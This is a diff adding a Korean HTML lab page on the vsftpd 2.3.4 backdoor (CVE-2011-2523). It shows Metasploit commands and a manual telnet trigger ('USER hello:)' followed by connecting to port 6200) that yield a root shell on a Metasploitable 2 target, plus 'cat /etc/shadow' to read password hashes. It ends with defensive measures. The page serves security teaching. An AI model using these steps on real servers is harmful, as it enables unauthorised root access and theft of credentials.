@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>vsftpd 2.3.4 Backdoor Command Execution 실습</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #0f172a; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header Section -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-6 flex justify-between items-center">
+            <div>
+                <h1 class="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 tracking-tight">
+                    <i class="fas fa-shield-halved text-cyan-500 mr-3"></i>Security Architecture Lab
+                </h1>
+                <p class="text-sm font-mono text-slate-400 mt-1 tracking-wider">CVE-2011-2523 : vsftpd 2.3.4 Backdoor Command Execution</p>
+            </div>
+            <div class="hidden md:block">
+                <span class="bg-red-500/10 text-red-400 border border-red-500/20 px-3 py-1 rounded-full text-xs font-bold font-mono">
+                    CVSS: 10.0 (CRITICAL)
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-6xl mx-auto px-6 py-12 space-y-16">
+
+        <!-- Section 1: Overview -->
+        <section class="space-y-6">
+            <h2 class="text-2xl font-bold border-l-4 border-cyan-500 pl-4 text-slate-100">
+                1. 취약점 개요 (Vulnerability Overview)
+            </h2>
+            <div class="bg-slate-800/40 border border-slate-700 rounded-2xl p-8 shadow-lg">
+                <p class="text-slate-300 text-lg">
+                    이 취약점은 역사상 가장 유명한 <strong class="text-cyan-300">공급망 공격 (Supply Chain Attack, 소프트웨어 배포 과정에 악성코드를 삽입하는 공격)</strong> 사례 중 하나입니다. 2011년, 누군가 vsftpd (Very Secure FTP Daemon, 매우 보안이 강화된 파일 전송 프로토콜 데몬) 프로젝트의 마스터 서버에 침입하여 소스 코드에 악의적인 백도어를 삽입했습니다.
+                </p>
+                <div class="mt-8 mb-6 text-center">
+                    <div class="inline-block border border-slate-600 rounded-xl overflow-hidden shadow-2xl">
+                        
+                    </div>
+                    <p class="text-sm text-slate-400 mt-3 font-mono">그림 1: vsftpd 2.3.4 백도어 트리거 및 리버스 쉘 연결 아키텍처</p>
+                </div>
+                <div class="bg-slate-900/80 border border-blue-900/50 rounded-lg p-5 mt-6">
+                    <h3 class="text-blue-400 font-bold mb-2"><i class="fas fa-info-circle mr-2"></i>작동 원리 (Mechanism)</h3>
+                    <p class="text-slate-300">
+                        사용자가 FTP 서버에 접속하여 <code class="bg-slate-800 px-2 py-1 rounded text-cyan-300">USER</code> 명령어를 보낼 때, 식별자 끝에 스마일리 이모티콘인 <code class="bg-slate-800 px-2 py-1 rounded text-pink-400 font-bold">:)</code> 문자를 포함시키면 서버 백그라운드에서 임의의 소켓이 열립니다. 이 소켓은 <strong class="text-red-400">TCP 6200번 포트</strong>에서 대기(Listening)하며, 해당 포트로 접속하는 누구에게나 루트(Root) 권한의 쉘(Shell, 운영체제 명령어 해석기)을 제공하게 됩니다.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 2: Environment Setup -->
+        <section class="space-y-6">
+            <h2 class="text-2xl font-bold border-l-4 border-cyan-500 pl-4 text-slate-100">
+                2. 실습 환경 (Lab Environment)
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <!-- Attacker Box -->
+                <div class="bg-slate-800/40 border border-slate-700 rounded-2xl p-6 relative overflow-hidden">
+                    <div class="absolute top-0 right-0 bg-cyan-600 text-white text-xs font-bold px-3 py-1 rounded-bl-lg">Attacker</div>
+                    <h3 class="text-xl font-bold text-slate-200 mb-4"><i class="fas fa-laptop-code text-cyan-400 mr-2"></i>공격자 시스템</h3>
+                    <ul class="space-y-3 text-slate-300 list-none">
+                        <li><i class="fas fa-check text-green-400 mr-2 text-sm"></i><strong>OS:</strong> Kali Linux (칼리 리눅스)</li>
+                        <li><i class="fas fa-check text-green-400 mr-2 text-sm"></i><strong>도구:</strong> MSF (Metasploit Framework, 메타스플로잇 프레임워크)</li>
+                        <li><i class="fas fa-check text-green-400 mr-2 text-sm"></i><strong>IP 예시:</strong> 192.168.50.10</li>
+                    </ul>
+                </div>
+                <!-- Target Box -->
+                <div class="bg-slate-800/40 border border-slate-700 rounded-2xl p-6 relative overflow-hidden">
+                    <div class="absolute top-0 right-0 bg-red-600 text-white text-xs font-bold px-3 py-1 rounded-bl-lg">Target</div>
+                    <h3 class="text-xl font-bold text-slate-200 mb-4"><i class="fas fa-server text-red-400 mr-2"></i>타겟 시스템</h3>
+                    <ul class="space-y-3 text-slate-300 list-none">
+                        <li><i class="fas fa-bullseye text-red-400 mr-2 text-sm"></i><strong>OS:</strong> Metasploitable 2 (메타스플로이터블 2)</li>
+                        <li><i class="fas fa-bullseye text-red-400 mr-2 text-sm"></i><strong>서비스:</strong> vsftpd v2.3.4 (TCP 21 포트 개방)</li>
+                        <li><i class="fas fa-bullseye text-red-400 mr-2 text-sm"></i><strong>IP 예시:</strong> 192.168.50.100</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="bg-red-900/20 border border-red-500/50 rounded-xl p-5 mt-6 flex items-start space-x-4">
+                <i class="fas fa-exclamation-triangle text-red-400 text-2xl mt-1"></i>
+                <div>
+                    <h4 class="font-bold text-red-400">AWS 실습 인프라 구축 시 주의사항 (과금 및 보안 경고)</h4>
+                    <p class="text-slate-300 mt-1 text-sm leading-relaxed">
+                        해당 실습을 위해 AWS EC2 (Elastic Compute Cloud, 아마존 탄력적 클라우드 컴퓨팅) 인스턴스를 구축할 경우, <strong>보안 그룹 (Security Group)</strong>의 인바운드 규칙에서 <code class="bg-slate-900 px-1 rounded text-red-300">TCP 21</code> 및 <code class="bg-slate-900 px-1 rounded text-red-300">TCP 6200</code> 포트를 절대 <code class="bg-slate-900 px-1 rounded text-red-300">0.0.0.0/0</code> (전체 허용)으로 개방해서는 안 됩니다. 전 세계의 자동화된 봇(Bot)들이 취약점을 스캔하여 시스템을 탈취하고, <strong>크립토 마이닝 (Crypto Mining, 암호화폐 채굴)</strong> 스크립트를 삽입하여 막대한 클라우드 요금이 과금될 수 있습니다. 반드시 본인의 공인 IP에서만 접근 가능하도록 제한하십시오.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: Metasploit Exploitation -->
+        <section class="space-y-8">
+            <h2 class="text-2xl font-bold border-l-4 border-cyan-500 pl-4 text-slate-100">
+                3. 메타스플로잇 (Metasploit) 기반 자동화 공격
+            </h2>
+            
+            <!-- Step 1 -->
+            <div class="space-y-3">
+                <h3 class="text-lg font-bold text-cyan-300">Step 1. 프레임워크 실행</h3>
+                <div class="terminal-bg rounded-xl p-4 border border-slate-700 font-mono text-sm shadow-xl">
+                    <div class="text-slate-400 mb-2">┌──(root㉿kali)-[~]</div>
+                    <div class="text-slate-200">└─# <span class="text-green-400">msfconsole</span> -q</div>
+                    <div class="text-slate-400 mt-2">
+msf6 >
+                    </div>
+                </div>
+                <div class="bg-slate-800/80 border-l-2 border-slate-500 p-3 rounded-r-lg">
+                    <p class="text-sm text-slate-300"><strong class="text-white">설명:</strong> <code>msfconsole</code> 명령어는 메타스플로잇 프레임워크의 대화형 콘솔(CLI) 환경을 시작합니다. <code>-q</code> (quiet) 옵션을 주면 초기 실행 시 나타나는 배너(그림)를 생략하고 빠르게 프롬프트를 띄웁니다.</p>
+                </div>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="space-y-3">
+                <h3 class="text-lg font-bold text-cyan-300">Step 2. 공격 모듈 검색</h3>
+                <div class="terminal-bg rounded-xl p-4 border border-slate-700 font-mono text-sm shadow-xl overflow-x-auto">
+                    <div class="text-slate-200">msf6 > <span class="text-green-400">search vsftpd</span></div>
+                    <div class="text-slate-400 mt-2 whitespace-pre">
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+                    </div>
+                </div>
+                <div class="bg-slate-800/80 border-l-2 border-slate-500 p-3 rounded-r-lg">
+                    <p class="text-sm text-slate-300"><strong class="text-white">설명:</strong> <code>search</code> 명령어를 통해 로컬 데이터베이스에 저장된 vsftpd 관련 취약점 모듈을 검색합니다. 검색 결과 중 <code>Rank</code>가 <span class="text-cyan-400">excellent</span>(매우 높음, 시스템을 멈추게 하지 않고 안정적으로 쉘을 획득함)인 백도어 모듈을 확인할 수 있습니다.</p>
+                </div>
+            </div>
+
+            <!-- Step 3 -->
+            <div class="space-y-3">
+                <h3 class="text-lg font-bold text-cyan-300">Step 3. 모듈 선택 및 타겟 설정</h3>
+                <div class="terminal-bg rounded-xl p-4 border border-slate-700 font-mono text-sm shadow-xl overflow-x-auto">
+                    <div class="text-slate-200">msf6 > <span class="text-green-400">use exploit/unix/ftp/vsftpd_234_backdoor</span></div>
+                    <div class="text-slate-400 mt-1">[*] No payload configured, defaulting to cmd/unix/interact</div>
+                    <div class="text-slate-200 mt-3">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > <span class="text-green-400">set RHOSTS 192.168.50.100</span></div>
+                    <div class="text-slate-400 mt-1">RHOSTS => 192.168.50.100</div>
+                    <div class="text-slate-200 mt-3">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > <span class="text-green-400">show options</span></div>
+                    <div class="text-slate-400 mt-2 whitespace-pre">
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   CHOST                    no        The local client address
+   CPORT                    no        The local client port
+   Proxies                  no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS  192.168.50.100   yes       The target host(s), see https://docs.metasploit.com/
+   RPORT   21               yes       The target port (TCP)
+                    </div>
+                </div>
+                <div class="bg-slate-800/80 border-l-2 border-slate-500 p-3 rounded-r-lg space-y-2">
+                    <p class="text-sm text-slate-300"><strong class="text-white">결과 분석:</strong> <code>use</code> 명령어로 식별된 경로의 모듈을 로드합니다. 프롬프트가 모듈 이름으로 변경되어 해당 모듈 컨텍스트 안으로 진입했음을 나타냅니다.</p>
+                    <p class="text-sm text-slate-300"><strong class="text-white">변수 설정:</strong> <code>set RHOSTS [타겟 IP]</code> 명령은 <strong>RHOSTS (Remote Hosts, 원격 타겟 시스템 호스트)</strong> 변수를 설정합니다. 공격할 대상의 IP 주소입니다. <code>show options</code>로 필수(Required) 항목들이 제대로 채워졌는지 검증합니다. RPORT는 기본값인 21번(FTP) 포트로 자동 지정되어 있습니다.</p>
+                </div>
+            </div>
+
+            <!-- Step 4 -->
+            <div class="space-y-3">
+                <h3 class="text-lg font-bold text-cyan-300">Step 4. 익스플로잇 (Exploit) 실행 및 쉘 획득</h3>
+                <div class="terminal-bg rounded-xl p-4 border border-slate-700 font-mono text-sm shadow-xl overflow-x-auto">
+                    <div class="text-slate-200">msf6 exploit(unix/ftp/vsftpd_234_backdoor) > <span class="text-red-400 font-bold">exploit</span></div>
+                    <div class="text-slate-400 mt-2 whitespace-pre">
+[*] 192.168.50.100:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.50.100:21 - USER: 331 Please specify the password.
+[+] 192.168.50.100:21 - Backdoor service has been spawned, handling...
+[+] 192.168.50.100:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.50.10:39485 -> 192.168.50.100:6200) at 2026-03-18 05:30:00 +0900
+
+<span class="text-slate-200"><span class="text-cyan-400">whoami</span></span>
+root
+<span class="text-slate-200"><span class="text-cyan-400">hostname</span></span>
+metasploitable
+                    </div>
+                </div>
+                <div class="bg-slate-800/80 border-l-2 border-red-500 p-3 rounded-r-lg space-y-2">
+                    <p class="text-sm text-slate-300"><strong class="text-white">결과 분석:</strong> <code>exploit</code> 명령어를 입력하면 모듈이 실행됩니다.</p>
+                    <ul class="text-sm text-slate-300 list-disc pl-5 mt-1 space-y-1">
+                        <li><span class="text-cyan-300">Banner 확인:</span> 대상 포트에 접속하여 데몬 버전이 취약한 2.3.4 버전이 맞는지 배너그래빙(Banner Grabbing)을 수행합니다.</li>
+                        <li><span class="text-cyan-300">USER 명령 전송:</span> 무작위 문자열 뒤에 <code>:)</code> 이모티콘이 포함된 계정명을 전송하여 백도어를 발동(Spawn)시킵니다.</li>
+                        <li><span class="text-cyan-300">Session Opened:</span> 타겟의 6200번 포트로 백그라운드 연결을 성공적으로 맺고, 세션 1(Session 1)을 오픈합니다. 이제 공격자는 원격 서버의 최상위 관리자(root) 권한으로 임의의 시스템 명령(<code>whoami</code>, <code>hostname</code> 등)을 수행할 수 있습니다.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 4: Manual Exploitation -->
+        <section class="space-y-6 pt-8 border-t border-slate-800">
+            <h2 class="text-2xl font-bold border-l-4 border-cyan-500 pl-4 text-slate-100">
+                4. 수동 공격 기법 (Manual Exploitation via Telnet)
+            </h2>
+            <div class="bg-slate-800/40 border border-slate-700 rounded-2xl p-8 shadow-lg">
+                <p class="text-slate-300 text-base mb-6">
+                    이 취약점의 구조가 매우 단순하기 때문에 메타스플로잇과 같은 공격 프레임워크 없이도, 터미널에서 기본 제공되는 <strong>Telnet (텔넷, 원격 터미널 접속 프로토콜)</strong>을 이용하여 수동으로 백도어를 트리거하고 접근할 수 있습니다. 시스템의 원리를 이해하는 데 중요한 실습입니다.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <!-- Terminal 1 -->
+                    <div>
+                        <h4 class="text-cyan-400 font-bold mb-2">터미널 1: 백도어 트리거 (21번 포트)</h4>
+                        <div class="terminal-bg rounded-xl p-4 border border-slate-700 font-mono text-sm shadow-xl min-h-[180px]">
+                            <div class="text-slate-200"># <span class="text-green-400">telnet 192.168.50.100 21</span></div>
+                            <div class="text-slate-400">Trying 192.168.50.100...<br>Connected to 192.168.50.100.<br>220 (vsFTPd 2.3.4)</div>
+                            <div class="text-slate-200 mt-2"><span class="text-green-400">USER hello:)</span></div>
+                            <div class="text-slate-400">331 Please specify the password.</div>
+                            <div class="text-slate-200 mt-2"><span class="text-green-400">PASS 1234</span></div>
+                            <div class="text-slate-400">^C (연결 대기 상태로 두고 터미널 2 열기)</div>
+                        </div>
+                    </div>
+
+                    <!-- Terminal 2 -->
+                    <div>
+                        <h4 class="text-red-400 font-bold mb-2">터미널 2: 백도어 접속 (6200번 포트)</h4>
+                        <div class="terminal-bg rounded-xl p-4 border border-slate-700 font-mono text-sm shadow-xl min-h-[180px]">
+                            <div class="text-slate-200"># <span class="text-green-400">telnet 192.168.50.100 6200</span></div>
+                            <div class="text-slate-400">Trying 192.168.50.100...<br>Connected to 192.168.50.100.</div>
+                            <div class="text-slate-200 mt-2"><span class="text-green-400">id</span></div>
+                            <div class="text-slate-400">uid=0(root) gid=0(root)</div>
+                            <div class="text-slate-200 mt-2"><span class="text-green-400">cat /etc/shadow</span></div>
+                            <div class="text-slate-400">root:$6$..... (비밀번호 해시 출력)</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 5: Security Insights -->
+        <section class="space-y-6 pt-8 border-t border-slate-800">
+            <h2 class="text-2xl font-bold border-l-4 border-cyan-500 pl-4 text-slate-100">
+                5. 아키텍트 인사이트 및 보안 대책
+            </h2>
+            <div class="bg-gradient-to-br from-slate-900 to-slate-800 border border-slate-700 rounded-2xl p-8 shadow-2xl">
+                <ul class="space-y-6 text-slate-300">
+                    <li class="flex items-start">
+                        <i class="fas fa-fingerprint text-cyan-400 text-xl mt-1 mr-4"></i>
+                        <div>
+                            <h4 class="text-lg font-bold text-slate-100">무결성 검증 (Integrity Check)의 중요성</h4>
+                            <p class="text-sm mt-1 leading-relaxed">
+                                공식 사이트에서 다운로드한 소프트웨어라 할지라도, 저장소가 해킹되어 파일이 변조되었을 가능성이 존재합니다. 오픈 소스 패키지를 운영 서버에 설치하기 전에는 반드시 배포자가 제공하는 <strong>해시값 (Hash, SHA-256 등 단방향 암호화 서명)</strong>을 확인하여 코드가 임의로 변경되지 않았는지 검증하는 파이프라인(DevSecOps)이 필요합니다.
+                            </p>
+                        </div>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-network-wired text-cyan-400 text-xl mt-1 mr-4"></i>
+                        <div>
+                            <h4 class="text-lg font-bold text-slate-100">네트워크 분리 및 포트 모니터링 (Network Segmentation)</h4>
+                            <p class="text-sm mt-1 leading-relaxed">
+                                인프라 아키텍처 관점에서, FTP 서버와 같이 외부에 노출되는 <strong>DMZ (Demilitarized Zone, 비무장지대 - 외부망과 내부망 사이의 완충 영역)</strong>의 서버들은 철저한 네트워크 접근 제어(ACL)가 필요합니다. 승인되지 않은 포트(예: 6200번)가 바인딩되어 외부로 열리는 행위를 <strong>IDS/IPS (침입 탐지/차단 시스템)</strong> 또는 클라우드의 <strong>VPC Flow Logs</strong>를 통해 실시간으로 감시하고 차단해야 합니다.
+                            </p>
+                        </div>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-box-archive text-cyan-400 text-xl mt-1 mr-4"></i>
+                        <div>
+                            <h4 class="text-lg font-bold text-slate-100">취약점 패치 (Patch Management)</h4>
+                            <p class="text-sm mt-1 leading-relaxed">
+                                현재 vsftpd는 지속적인 업데이트를 통해 해당 백도어 취약점이 제거된 버전을 제공하고 있습니다. 운영 중인 서버의 패키지 버전을 정기적으로 스캐닝하고 최신 안정화 버전으로 유지보수(Update & Upgrade)하는 것이 인프라 운영의 핵심입니다.
+                            </p>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </section>
+
+    </main>
+</body>
+</html>
